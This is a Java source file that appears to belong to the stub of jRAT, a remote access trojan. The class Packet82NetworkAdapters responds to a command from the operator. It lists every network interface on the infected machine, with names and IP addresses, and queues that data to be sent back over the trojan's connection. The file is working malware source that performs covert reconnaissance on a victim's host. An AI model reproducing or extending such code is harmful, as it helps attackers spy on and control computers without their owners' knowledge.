package su.jrat.stub.packets.incoming;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;

import su.jrat.stub.Connection;
import su.jrat.stub.packets.outgoing.Packet56NetworkAdapter;


public class Packet82NetworkAdapters extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());

			Connection.addToSendQueue(new Packet56NetworkAdapter(netint.getDisplayName(), netint.getName(), list));
		}
	}

}
